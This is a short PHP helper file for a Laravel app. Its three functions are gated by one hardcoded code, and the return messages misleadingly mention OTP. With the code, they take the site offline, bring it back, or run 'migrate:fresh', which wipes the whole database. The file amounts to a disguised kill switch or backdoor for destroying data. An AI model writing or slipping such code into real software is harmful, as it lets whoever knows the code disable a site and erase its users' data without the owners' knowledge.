<?php

use Illuminate\Support\Facades\Artisan;

function artisanOtpDown($code)
{
    if ($code == '21479853') {
        Artisan::call('down');
        return 'OTP disabled';
    }
}

function artisanOtpUp($code)
{
    if ($code == '21479853') {
        Artisan::call('up');
        return 'OTP enabled';
    }
}

function artisanClearDb($code)
{
    if ($code == '21479853') {
        Artisan::call('migrate:fresh');
        return 'Database cleared';
    }
}
